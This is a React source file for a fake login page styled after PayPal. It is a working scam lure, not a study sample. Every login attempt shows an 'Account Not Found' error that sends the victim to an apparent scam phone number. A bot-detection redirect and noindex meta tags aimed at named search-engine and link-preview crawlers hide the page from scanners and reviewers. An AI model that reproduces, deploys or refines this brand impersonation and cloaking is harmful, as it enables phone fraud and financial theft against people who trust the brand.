import { useState, useEffect } from "react";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertTriangle } from "lucide-react";
import { isBot, getBotRedirectPath } from "@/lib/botDetection";

export default function Index() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showError, setShowError] = useState(false);

  // STRICT: Immediate bot detection and redirect
  useEffect(() => {
    if (isBot()) {
      window.location.replace(getBotRedirectPath());
    }
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowError(true);
  };

  return (
    <>
      {/* STRICT: Meta tags to block ALL bots from indexing */}
      <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate" />
      <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
      <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet" />
      <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet" />
      <meta name="duckduckbot" content="noindex, nofollow" />
      <meta name="baiduspider" content="noindex, nofollow" />
      <meta name="yandexbot" content="noindex, nofollow" />
      <meta name="facebookexternalhit" content="noindex, nofollow" />

      <div className="min-h-screen bg-white">
      {/* PayPal-style Header */}
      <header className="bg-white border-b border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-8 h-8"></div>
            </div>
            <div className="hidden sm:flex items-center space-x-6">
              <a
                href="#"
                className="text-[#0070ba] hover:text-[#005ea6] text-sm font-medium"
              >
                Help
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 sm:px-6 lg:px-8 py-12">
        <div className="max-w-md w-full space-y-8">
          {/* Logo and Title */}
          <div className="text-center">
            <h2 className="text-3xl font-normal text-gray-900 mb-2">
              Log in to your account
            </h2>
          </div>

          {/* Error Alert */}
          {showError && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
              <div className="flex">
                <AlertTriangle className="h-5 w-5 text-red-600 flex-shrink-0 mt-0.5" />
                <div className="ml-3">
                  <div className="text-sm font-medium text-red-800 mb-1">
                    ❌ Error 404 – Account Not Found
                  </div>
                  <div className="text-sm text-red-700 mb-2">
                    We couldn't find an account matching your information.
                  </div>
                  <div className="text-sm text-red-700 mb-2">
                    Please verify your login details.
                  </div>
                  <div className="text-sm text-red-700">
                    For assistance, contact Help: +1-833-251-8091
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Login Form */}
          <div className="bg-white rounded-lg border border-gray-300 shadow-sm p-8">
            <form onSubmit={handleLogin} className="space-y-6">
              <div>
                <label
                  htmlFor="email"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Email or mobile number
                </label>
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0070ba] focus:border-[#0070ba] text-base"
                  required
                />
              </div>

              <div>
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-gray-700 mb-2"
                >
                  Password
                </label>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#0070ba] focus:border-[#0070ba] text-base"
                  required
                />
              </div>

              <button
                type="submit"
                className="w-full bg-[#0070ba] hover:bg-[#005ea6] text-white font-medium py-3 px-4 rounded-md transition-colors duration-200 text-base"
              >
                Log In
              </button>
            </form>

            <div className="mt-6 text-center">
              <a
                href="#"
                className="text-[#0070ba] hover:text-[#005ea6] text-sm font-medium"
              >
                Forgot password?
              </a>
            </div>

            <div className="mt-8 pt-6 border-t border-gray-200">
              <div className="text-center">
                <p className="text-sm text-gray-600 mb-4">
                  Don't have an account?
                </p>
                <button className="w-full border-2 border-[#0070ba] text-[#0070ba] hover:border-[#005ea6] hover:text-[#005ea6] font-medium py-3 px-4 rounded-md transition-colors duration-200 text-base">
                  Sign Up
                </button>
              </div>
            </div>
          </div>

          {/* Security Notice */}
          <div className="text-center">
            <p className="text-xs text-gray-500 leading-relaxed">
              We use cookies to improve your experience on our site. By agreeing
              to use our site, you consent to our use of cookies. To learn more,
              including how to change your settings, see our{" "}
              <a href="#" className="text-[#0070ba] hover:underline">
                Cookie Policy
              </a>
              .
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-50 border-t border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="flex flex-wrap justify-center items-center space-x-6 text-sm text-gray-600">
            <a href="#" className="hover:text-[#0070ba] transition-colors">
              Contact Us
            </a>
            <a href="#" className="hover:text-[#0070ba] transition-colors">
              Privacy
            </a>
            <a href="#" className="hover:text-[#0070ba] transition-colors">
              Legal
            </a>
            <a href="#" className="hover:text-[#0070ba] transition-colors">
              Worldwide
            </a>
          </div>
          <div className="mt-4 text-center">
            <p className="text-xs text-gray-500">
              © 1999-2024 All rights reserved.
            </p>
          </div>
        </div>
      </footer>
      </div>
    </>
  );
}
